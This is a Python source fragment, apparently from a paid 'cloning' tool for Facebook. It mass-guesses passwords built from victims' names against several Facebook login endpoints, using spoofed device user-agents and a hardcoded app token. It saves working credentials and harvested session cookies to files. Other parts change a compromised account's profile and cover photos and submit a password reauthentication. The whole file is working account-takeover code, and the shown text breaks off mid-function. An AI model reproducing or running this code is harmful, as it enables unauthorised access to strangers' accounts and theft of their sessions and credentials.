                ps = {'file':('image.jpg', urllib.request.urlopen(c_photos_link).read())}
                sort_update_page(pp, ps)
            except:
                pp = {'file':('image.jpg', urllib.request.urlopen('https://i.pinimg.com/736x/cc/02/64/cc0264ee6d8d787cc0fe7035728c7bd9.jpg').read())}
                ps = {'file':('image.jpg', urllib.request.urlopen('https://user-images.githubusercontent.com/98658558/256292121-d9d10743-b2dd-4dd7-857e-a3354296bdb2.png').read())}
                sort_update_page(pp, ps)
        #p_id='61552905060107'
        def sort_update_page(pp, ps):
            try:
                r = requests.Session()
                req = bs(r.get('https://www.facebook.com/profile.php', headers=headers, cookies={'cookie': cok}).content, 'html.parser')
                usr = re.search('__user=(.*?)&', str(req)).group(1)
                hst = re.search('"haste_session":"(.*?)",', str(req)).group(1)
                rev = re.search('{"rev":(.*?)}', str(req)).group(1)
                hsi = re.search('"hsi":"(.*?)",', str(req)).group(1)
                dts = re.search('"DTSGInitialData",\[\],{"token":"(.*?)"', str(req)).group(1)
                jzt = re.search('&jazoest=(.*?)",', str(req)).group(1)
                lsd = re.search('"LSD",\[\],{"token":"(.*?)"', str(req)).group(1)
                spr = re.search('"__spin_r":(.*?),', str(req)).group(1)
                spt = re.search('"__spin_t":(.*?),', str(req)).group(1)
                dat = {'profile_id': usr, 'photo_source': 57, 'av': usr, '__user': usr, '__a': '1', '__hs': hst,
                    'dpr': '1.5', '__ccg': 'EXCELLENT', '__rev': rev, '__hsi': hsi, '__comet_req': '15',
                    'fb_dtsg': dts, 'jazoest': jzt, 'lsd': lsd, '__spin_b': 'trunk', '__spin_r': spr,
                    '__spin_t': spt}
                pp_s = profile_pic(r, usr, cok, dat, pp)
                ps_s = cover_pic(r, usr, cok, dat, ps)
                print('%s -%s Uploaded\n   - %s Uploaded\n' % (mahdix.LI_GREEN,pp_s, ps_s))
            except Exception as e:
                print('[ %s ]\n   - Error, Something Went Wrong\n   - %s\n' % (p_id, e))

        def profile_pic(r, usr, cok, dat, fot):
            pos = r.post('https://www.facebook.com/profile/picture/upload/', data=dat, files=fot, cookies={'cookie': cok},
                        allow_redirects=True).text
            idf = re.search('"fbid":"(.*?)"', str(pos)).group(1)
            var = {"input": {"attribution_id_v2": "ProfileCometTimelineListViewRoot.react,comet.profile.timeline.list,unexpected,1691995795397,606186,190055527696468,;ProfileCometTimelineListViewRoot.react,comet.profile.timeline.list,via_cold_start,1691995566176,267870,190055527696468,",
                            "caption": "", "existing_photo_id": idf, "expiration_time": None, "profile_id": usr,
                            "profile_pic_method": "EXISTING", "profile_pic_source": "TIMELINE",
                            "scaled_crop_rect": {"height": 1, "width": 1, "x": 0, "y": 0}, "skip_cropping": True,
                            "actor_id": usr, "client_mutation_id": "2"},
                "isPage": False, "isProfile": True, "sectionToken": "UNKNOWN", "collectionToken": "UNKNOWN", "scale": 1.5}
            dat.update({'fb_api_caller_class': 'RelayModern', 'fb_api_req_friendly_name': 'ProfileCometProfilePictureSetMutation',
                        'server_timestamps': True, 'doc_id': '6809797452364179', 'variables': json.dumps(var)})
            pos = r.post('https://www.facebook.com/api/graphql/', data=dat, cookies={'cookie': cok}, allow_redirects=True).text
            if '"profilePhoto":{"url"' in str(pos):
                return 'Success'
            else:
                return 'Failed'

        def cover_pic(r, usr, cok, dat, fot):
            pos = r.post('https://www.facebook.com/profile/cover/comet_upload/', data=dat, files=fot, cookies={'cookie': cok},
                        allow_redirects=True).text
            idf = re.search('"fbid":"(.*?)"', str(pos)).group(1)
            var = {"input": {"attribution_id_v2": "ProfileCometTimelineListViewRoot.react,comet.profile.timeline.list,via_cold_start,1691996321249,689114,190055527696468,",
                            "cover_photo_id": idf, "focus": {"x": 0.5, "y": 0.49894996734679936}, "target_user_id": usr,
                            "actor_id": usr, "client_mutation_id": "1"}, "scale": 1.5, "contextualProfileContext": None}
            dat.update({'fb_api_caller_class': 'RelayModern', 'fb_api_req_friendly_name': 'ProfileCometCoverPhotoUpdateMutation',
                        'server_timestamps': True, 'doc_id': '6098388686937277', 'variables': json.dumps(var)})
            pos = r.post('https://www.facebook.com/api/graphql/', data=dat, cookies={'cookie': cok}, allow_redirects=True).text
            if '"cover_photo":{"focus"' in str(pos):
                return 'Success'
            else:
                return 'Failed'
        headers = {
            'authority': 'www.facebook.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9,id;q=0.8,bn;q=0.7',
            'dpr': '1.1',
            'referer': 'https://www.facebook.com/',
            'sec-ch-prefers-color-scheme': 'light',
            'sec-ch-ua': '"Chromium";v="118", "Google Chrome";v="118", "Not=A?Brand";v="99"',
            'sec-ch-ua-full-version-list': '"Chromium";v="118.0.5993.118", "Google Chrome";v="118.0.5993.118", "Not=A?Brand";v="99.0.0.0"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-model': '""',
            'sec-ch-ua-platform': '"Windows"',
            'sec-ch-ua-platform-version': '"15.0.0"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
            'viewport-width': '750',
        }
        main_update_page()
    except:
        open('aaaa.txt','a').write(f'{link}\n{link2}\n')
def leave_page(coki):
    sec=requests.Session()
    params = {
            'tab': 'profile_access',
        }
    req = sec.get('https://www.facebook.com/settings/', params=params, cookies={'cookie':coki}, headers=headers_global)
    av=re.search('__user=(.*?)&',str(req.text)).group(1)
    usr = re.search('__user=(.*?)&', str(req)).group(1)
    hst = re.search('"haste_session":"(.*?)",', str(req)).group(1)
    rev = re.search('{"rev":(.*?)}', str(req)).group(1)
    hsi = re.search('"hsi":"(.*?)",', str(req)).group(1)
    dts = re.search('"DTSGInitialData",\[\],{"token":"(.*?)"', str(req)).group(1)
    jzt = re.search('&jazoest=(.*?)",', str(req)).group(1)
    lsd = re.search('"LSD",\[\],{"token":"(.*?)"', str(req)).group(1)
    spr = re.search('"__spin_r":(.*?),', str(req)).group(1)
    spt = re.search('"__spin_t":(.*?),', str(req)).group(1)
    pas='#PWD_BROWSER:0:{}:{}'.format(int(tim()),password)
    data = {
        'av': av,
    '__user':av,
    '__a': '1',
    '__req': 'n',
    '__hs': '19666.HYP:comet_plat_default_pkg.2.1..2.1',
    'dpr': '1',
    '__ccg': 'MODERATE',
    '__rev':rev,
    '__hsi': hsi,
    '__comet_req': '1',
    'fb_dtsg':dts ,
    'jazoest': jzt,
    'lsd': lsd,
    '__aaid': '0',
    '__spin_r': spr,
    '__spin_b': 'trunk',
    '__spin_t': spt,
    'fb_api_caller_class': 'RelayModern',
    'fb_api_req_friendly_name': 'ProfilePlusMarkReauthedMutation',
    'variables': '{"input":{"password":{"sensitive_string_value":"%s"},"actor_id":"%s","client_mutation_id":"3"}}'%(pas,av),
    'server_timestamps': 'true',
    'doc_id': '5048033918567225',}
    json_data = requests.post('https://www.facebook.com/api/graphql/', cookies={'cookie':coki}, headers=headers_grapql, data=data)
    parsed_data = json.loads(json_data.text)
    reauth_is_successful = parsed_data['data']['admin_management_mark_reauthed']['reauth_is_successful']
    print(reauth_is_successful)  #


clear()
print(logo)
for i in range(lemite):
    creating()

result = creating()
if "invalid" in result:
        mainmenu()
else:
        pass

def menu():
    clear()
    print(' [1] File Cloning')
    ###print(' [2] New Account Generator')
    ###print(' [2] File Making')
    linex()
    xd = input(' Choose an option: ')
    if xd in ['1', '01']:
        clear()
        print(' Put file example:  /sdcard/File.txt  ')
        linex()
        file = input(' Put file path\033[1; \033[92;1m: ')
        try:
            fo = open(file, 'r').read().splitlines()
        except FileNotFoundError:
            print(' File location not found ')
            time.sleep(1)
            menu()
        clear()
        print(' [1] Method 1 [OLD ALGORITHM]')
        ###print(' [2] Method 2 [OLD ALGORITHM]')
        ###print(' [3] Method 3 [OLD ALGORITHM]')
        ###print(' [4] Method 4 [NEW ALGORITHM]')
        ###print(' [5] Method 5 [NEW ALGORITHM]')
        linex()
        mthd = input(' Choose: ')
        linex()
        plist = []
        print(' Select Password Crack Menu:')
        linex()
        print(' [1] Crack with Automatic Password \n [2] Crack with Password Choice \n [3] Working Passwords for Cloning ')
        linex()
        ppp = input('\033[1;32m Choose: ')
        if ppp in ['1', '01']:
            plist.append('first last')
            plist.append('firstlast')
            # Add other password options here
        elif ppp in ['3', '03']:
            clear()
            print(' \033[1;32mWorking password for Philippines\033[1;37m ')
            linex()
            print(' [1] first last\n [2] firstlast\n [3] first123\n [4] first1234\n [5] first786\n [6] first110\n [7] firstlast123\n [8] firstlast786\n [9] firstlast110')
            # Add more password options here
            linex()
            input(' Press enter to back menu ')
            menu()
        else:
            try:
                linex()
                ps_limit = int(input(' How many passwords do you want to add? '))
            except:
                ps_limit = 1
            linex()
            print('\033[1;32m example: first last,firtslast,first123')
            linex()
            for i in range(ps_limit):
                plist.append(input(f'\033[1;32mPut password {i+1}: '))
        #linex()
        ###print(' Do you want to show cookies? (y/n): ')
        #linex()
        ####c = input('\033[1;32m Choose: ')
        #######if (c).lower() == "y":
            ####user_opt.append("c")
        #$$#$$##with tred(max_workers=30) as Aking:
            linex()
            print(' Do you want to show cp accounts? (y/n): ')
        linex()
        cx = input('\033[1;32m Choose: ')
        if cx in ['y', 'Y', 'yes', 'Yes', '1']:
            pcp.append('y')
        else:
            pcp.append('n')
        with tred(max_workers=30) as crack_submit:
            clear()
            total_ids = str(len(fo))
            print(' [•] Total accounts : \033[1;32m' + total_ids + f' \033[1;33m---\033[1;33m> \033[1;37mMethod Number :\033[1;37m {mthd}')
            print("\033[1;37m \x1b[38;5; \033[92;1m[•] Use airplane mode every 200 counts.\033[1;37m")
            linex()
            for user in fo:
                ids, names = user.split('|')
                passlist = plist
                if mthd in ['1', '01']:
                    crack_submit.submit(ffb1, ids, names, passlist)
                #######elif mthd in ['2', '02']:
                    #####crack_submit.submit(ffb2, ids, names, passlist)
                #######elif mthd in ['3', '03']:
                    ######crack_submit.submit(ffb3, ids, names, passlist)
                #######elif mthd in ['4', '04']:
                    ######crack_submit.submit(ffb4, ids, names, passlist)
                #######elif mthd in ['5', '05']:
                    ######crack_submit.submit(ffb5, ids, names, passlist)

        print('\033[1;37m')
        linex()
        print(' The process has completed')
        print(' Total OK/CP/2F: ' + str(len(oks)) + '/' + str(len(cps)) + '/' + str(len(twf)))
        linex()
        input(' Press enter to go back ')
        os.system('python ZIDI.py')
    #######elif xd in ['2','02']:
		    ##create()
    ##elif xd in ###['3','03']:
    #file_making()

""" #APPROVAL

def Subscription():
	key1=open('/data/data/com.termux/files/usr/bin/.mrBALOCH -cov', 'r').read()
	clear()
	print(logo)
	r1=str(urlopen("https://github.com/GodBishesh/tool-approval/blob/main/approvalSheet.txt").read())
	if key1 in r1:
		os.system('clear')
		print(logo)
	else:
		os.system("clear")
		print(logo)
		print("\t \033[1;32m Please Get Approval First\033[1;37m ")
		time.sleep(1)
		os.system("clear")
		print(logo)
		print ("")
		print(" \033[1;32m Alexander Grayson's RPW Cloning Tool [Black Market] \033[1;37m\n")
		print(" \033[1;32m Note : THIS IS A PAID TOOL!   \033[1;37m")
		print ("")
		print(" [ Mode of Payment : GCASH ] ")
		print("")
		print(" Your key is not Approved. ")
		print("")
		print(" Copy and Send Key To Alexander Grayson")
		print ("")
		print (" Your Key : "+key1 )
		print ("")
		name = input(" Your Name : ")
		print ("")
		lol = input(" Your Email : ")
		print ("")
		input(" Press Enter To Send Key")
		time.sleep(3.5)
		tks = 'Dear%20Admin,%20Please%20Approved%20My%20Key%20To%20Premium%20%20Thanks%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20Email%20:%20'+lol+'%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20Name%20:%20'+name+'%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20%20Key%20%20:%20'+key1
		os.system('am start https://m.me/AlexanderGraysonRecovery.IAmLimitless' + tks)
		Subscription()                                                                                 
Subscription()   """

##################################

##METHOD 5 B-API
def ffb5(ids,names,passlist):
		try:
			global ok,loop
			sys.stdout.write('\r\r\033[1;37m [ALEX-CRACKING]  %s | ALIVE: %s | CHECKPOINT: %s\033[1;37m'%(loop,len(oks),len(cps)));sys.stdout.flush()
			fn = names.split(' ')[0]
			try:
				ln = names.split(' ')[1]
			except:
				ln = fn
			for pw in passlist:
				pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
				
				application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
				application_version_code=str(random.randint(000000000,999999999))
				__iam_genius = random.choice(android_models)
				phone_model = __iam_genius.split('|')[0]
				phone_company = __iam_genius.split('|')[1]
				dimensions = __iam_genius.split('|')[2]
				ffb=random.choice(fbks)
				dvlk = random.choice(usr)
				
###################################

				ua_string = f'{str(dvlk)} [FBAN/FB4A;FBAV/{str(application_version)};FBPN/com.facebook.katana;FBLC/en_PK;FBCR/Yoigo Spain;FBBV/{str(application_version_code)};FBMF/{str(phone_company)};FBBD/{str(phone_company)};FBDV/{str(phone_company)};FBSV/8.1.0;;FBDM/'+'{density=2.75,height=1440,width=720};]'
				
###################################
				li = ['28','29','210']
				li2 = random.choice(li)
				j1 = ''.join(random.choice(digits) for _ in range(2))
				j2 = li2+j1
				device_family_id = str(uuid.uuid4())
				adid = str(uuid.uuid4())
				machine_id = ''.join(random.choice(ascii_uppercase+ascii_lowercase+digits+'_') for _ in range(24))
				data = {'adid':adid,
				'format':'json',
				'device_id':device_family_id,
				'email':ids,
				'password':pas,
				'generate_analytics_claim':'1',
				'community_id':'','cpl':'true','try_num':'1',
				'family_device_id':device_family_id,
				'credentials_type':'device_based_login_password',
				'generate_session_cookies':'1',
				'error_detail_type':'button_with_disabled',
				'source':'device_based_login',
				'machine_id':machine_id,
				'login_location_accuracy_m':'1.0',
				'meta_inf_fbmeta':'',
				'advertiser_id':adid,
				'encrypted_msisdn':'',
				'currently_logged_in_userid':'0',
				'locale':'en_PK',
				'client_country_code':'PK',
				'method':'auth.login',
				'fb_api_req_friendly_name':'authenticate',
				'fb_api_caller_class':'com.facebook.account.login.protocol.Fb4aAuthHandler',
				'access_token':'350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
				head = {
				'content-type':'application/x-www-form-urlencoded',
				'x-fb-sim-hni':str(random.randint(2e4,4e4)),
				'x-fb-connection-type':'unknown',
				'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
				'user-agent':ua_string,
				'x-fb-net-hni':str(random.randint(2e4,4e4)),
				'x-fb-connection-bandwidth':str(random.randint(2e7,3e7)),
				'x-fb-connection-quality':'EXCELLENT',
				'x-fb-friendly-name':'authenticate',
				'accept-encoding':'gzip, deflate',
				'x-fb-http-engine':	'Liger'}
				url = 'https://b-api.facebook.com/method/auth.login'
				po = requests.post(url,data=data,headers=head,allow_redirects=False).text
				q = json.loads(po)
				if 'session_key' in q:
					print('\r\r\033[1;32m [ALEX-ALIVE] '+uid+' | '+pas+' | ['+gray(uid)+']\033[1;97m')
					open('/sdcard/ALEX-OK.txt','a').write(ids+'|'+pas+'\n')
					oks.append(ids)
					break
				elif 'www.facebook.com' in q['error_msg']:
					if 'y' in pcp:
						print('\r\r\x1b[1;93m [CHECKPOINT] '+ids+' | '+pas+' | ['+alex(ids)+']\033[1;97m')
						open('/sdcard/ALEX-CP.txt','a').write(ids+'|'+pas+'\n')
						cps.append(ids)
						break
					else:
						open('/sdcard/ALEX-CP.txt','a').write(ids+'|'+pas+'\n')
						break
				else:
					continue
			loop+=1
		except requests.exceptions.ConnectionError:
			time.sleep(10)

##################################

##METHOD 4 B-GRAPH METHOD
def ffb4(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write('\r\r\033[1;37m [ALEX-CRACKING]  %s | ALIVE: %s | CHECKPOINT: %s\033[1;37m'%(loop,len(oks),len(cps)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                        ln = fn
                for pw in passlist:
                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                        fbbv = str(random.randint(111111111,999999999))
                        android_version = device['android_version']
                        model = device['model']
                        build = device['build']
                        fblc = device['fblc']
                        fbcr = sim_id
                        fbmf = device['fbmf']
                        fbbd = device['fbbd']
                        fbdv = device['fbdv']
                        fbsv = device['fbsv']
                        fbca = device['fbca']
                        fbdm = device['fbdm']
                        fbfw = '1'
                        fbrv = '0'
                        fban = 'FB4A'
                        fbpn = 'com.facebook.katana'
                        en = random.choice(['en_US','en_GB'])
                        cph = random.choice(['CPH1979','CPH1983','CPH1987','CPH2005','CPH2009','CPH2015','CPH2059','CPH2061','CPH2065','CPH2069','CPH2071','CPH2073','CPH2077','CPH2091','CPH2095','CPH2099','CPH2137','CPH2139','CPH2145','CPH2161','CPH2185','CPH2201','CPH2209','CPH1801','CPH1803','CPH1805','CPH1809','CPH1827','CPH1837','CPH1851','CPH1853'])
                        network = random.choice(['Zong','null','Marshmallow','Telekom China'])
                        
###################################                        
                        ua ='Davik/2.1.0 (Linux; U; Android 7.0.0; MMB29K Build/GT-P5100 [FBAN/FB4A;FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/{density=2.3,width=1080,height=1472};FBLC/en_US;FBRV/'+fbrv+';FBCR/Koodo Canada;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ZenFone;FBSV/'+fbsv+';FBOP/1;FBCA/arm64-v8a:]'
                       
###################################                    
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
                        family = str(uuid.uuid4())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        xd =str(''.join(random_seed.choices(string.digits, k=20)))
                        sim_serials = f'["{xd}"]'
                        li = ['28','29','210']
                        li2 = random.choice(li)
                        j1 = ''.join(random.choice(digits) for _ in range(2))
                        jazoest = li2+j1
                        data={"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email":ids,"password":pas,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_US","client_country_code": "US","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}
                        headers = {"Content-Type": "application/x-www-form-urlencoded","Host": "graph.facebook.com","User-Agent": ua,"X-FB-Net-HNI": "45204","X-FB-SIM-HNI": "45201","X-FB-Connection-Type": "MOBILE.LTE","X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group": "5120","X-FB-Friendly-Name": "ViewerReactionsMutation","X-FB-Request-Analytics-Tags": "graphservice","Accept-Encoding": "gzip, deflate","X-FB-HTTP-Engine": "Liger","X-FB-Client-IP": "True","X-FB-Server-Cluster": "True","x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62","Connection": "Keep-Alive"}
                        url = 'https://b-graph.facebook.com/auth/login'
                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        print('\r\r\033[1;32m [ALEX-ALIVE] '+uid+' | '+pas+' | ['+alex(uid)+'] |'+coki+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        #print("\r\r\033[1;33m Cookie: "+coki)
                                        open('/sdcard/ALEX-COOKIE.txt','a').write(ids+'|'+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/ALEX-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r\x1b[1;93m [CHECKPOINT] '+ids+' | '+pas+' | ['+alex(ids)+']\033[1;97m')
                                                twf.append(ids)
                                                break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                
                                                open('/sdcard/ALEX-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                                        else:
                                                open('/sdcard/ALEX-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                        else:
                                        continue
                loop+=1
        except Exception as e:
                pass

##################################

##METHOD 3 mbasic.facebook.com
def ffb3(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [ALEX-CRACKING]  %s | ALIVE: %s | CHECKPOINT: %s\033[1;37m'%(loop,len(oks),len(cps)));sys.stdout.flush()
        session = requests.Session()
        try:
                first = names.split(' ')[0]
                try:
                        last = names.split(' ')[1]
                except:
                        last = 'Khan'
                ps = first.lower()
                ps2 = last.lower()
                for fikr in passlist:
                        pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)
                        android_version=str(random.randrange(6,13))
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                        fbbv = str(random.randint(111111111,999999999))
                        android_version = device['android_version']
                        model = device['model']
                        build = device['build']
                        fblc = device['fblc']
                        fbcr = sim_id
                        fbmf = device['fbmf']
                        fbbd = device['fbbd']
                        fbdv = device['fbdv']
                        fbsv = device['fbsv']
                        fbca = device['fbca']
                        fbdm = device['fbdm']
                        fbfw = '1'
                        fbrv = '0'
                        fban = 'FB4A'
                        model = random.choice(['itel vesion 3 plus','Infinix X672','Infinix X6815B','Infinix X6815B','Infinix X6515','Infinix X6516','Infinix X6825','Infinix X5516B','Infinix X669C','Infinix X669D','Infinix X6815C','Infinix X670','Infinix X5516C','Infinix X6826B','Infinix X5516C','Infinix X676C','Infinix X697','Infinix X5516B','Infinix X6515','Infinix X6811'])
                        fbap = random.choice(['738.0.0.11.397','60.0.0.16.76','419.0.0.20.71','504.0.0.28482','354.0.0.8.108','405.0.0.16.112','414.0.0.30.113','400.0.0.37.76','414.0.0.30.113','408.1.0.16.113'])
                        
###################################                      
                        ua = '[FBAN/FB4A;FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/{density=3.3,width=1080,height=1478};FBLC/en_US;FBRV/'+fbrv+';FBCR/TrueMove Thailand;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A107F;FBSV/'+fbsv+';FBOP/1;FBCA/arm64-v8a:]'

###################################               
                        head = {'Host': 'mbasic.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Android"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'same-origin', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-GB,en;q=0.9,si-LK;q=0.8,si;q=0.7,en-US;q=0.6'}
                        getlog = session.get(f'https://mbasic.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
                        idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
                        complete = session.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
                        VEER=session.cookies.get_dict().keys()
                        if "c_user" in VEER:
                                coki=session.cookies.get_dict()
                                kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                print(f'\r\r\x1b[1;92m [ALEX-ALIVE] %s | %s | %s | %s'%(ids,pas,alex(ids),kuki))
                                open('/sdcard/ALEX-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                open('/sdcard/Alex-COOKIE.txt', 'a').write(ids+'|'+pas+'|'+kuki+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in VEER:
                                if 'y' in pcp:
                                        print('\r\r\x1b[1;93m [CHECKPOINT] '+ids+' | '+pas+' | ['+alex(ids)+']\033[1;97m')
                                        open('/sdcard/ALEX-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
                        else:
                                continue
                loop+=1
        except requests.exceptions.ConnectionError:
                time.sleep(20)
        except Exception as e:
                pass
        
##################################

##METHOD 2 m.facebook.com
def ffb2(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [ALEX-CRACKING]  %s | ALIVE: %s | CHECKPOINT: %s\033[1;37m'%(loop,len(oks),len(cps)));sys.stdout.flush()
        session = requests.Session()
        try:
                first = names.split(' ')[0]
                try:
                        last = names.split(' ')[1]
                except:
                        last = 'Khan'
                ps = first.lower()
                ps2 = last.lower()
                for fikr in passlist:
                        pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)
                        android_version=str(random.randrange(6,13))
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                        fbbv = str(random.randint(111111111,999999999))
                        android_version = device['android_version']
                        model = device['model']
                        build = device['build']
                        fblc = device['fblc']
                        fbcr = sim_id
                        fbmf = device['fbmf']
                        fbbd = device['fbbd']
                        fbdv = device['fbdv']
                        fbsv = device['fbsv']
                        fbca = device['fbca']
                        fbdm = device['fbdm']
                        fbfw = '1'
                        fbrv = '0'
                        fban = 'FB4A'
                        model = random.choice(['itel vesion 3 plus','Infinix X672','Infinix X6815B','Infinix X6815B','Infinix X6515','Infinix X6516','Infinix X6825','Infinix X5516B','Infinix X669C','Infinix X669D','Infinix X6815C','Infinix X670','Infinix X5516C','Infinix X6826B','Infinix X5516C','Infinix X676C','Infinix X697','Infinix X5516B','Infinix X6515','Infinix X6811'])
                        fbap = random.choice(['738.0.0.11.397','60.0.0.16.76','419.0.0.20.71','504.0.0.28482','354.0.0.8.108','405.0.0.16.112','414.0.0.30.113','400.0.0.37.76','414.0.0.30.113','408.1.0.16.113'])
                        
###################################                      
                        ua = '[FBAN/FB4A;FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/{density=3.1,width=1080,height=1408};FBLC/en_US;FBRV/'+fbrv+';FBCR/Vivacom Bulgaria;FBMF/xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Xiaomi Redmi Note 11 Pro+;FBSV/'+fbsv+';FBOP/1;FBCA/arm64-v8a:]'

###################################               
                        head = {'Host': 'm.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform':'"Android"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
                        getlog = session.get(f'https://m.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
                        idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://m.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
                        complete = session.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
                        VEER=session.cookies.get_dict().keys()
                        if "c_user" in VEER:
                                coki=session.cookies.get_dict()
                                kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                print(f'\r\r\x1b[1;92m [ALEX-ALIVE] %s | %s | %s | %s'%(ids,pas,alex(ids),kuki))
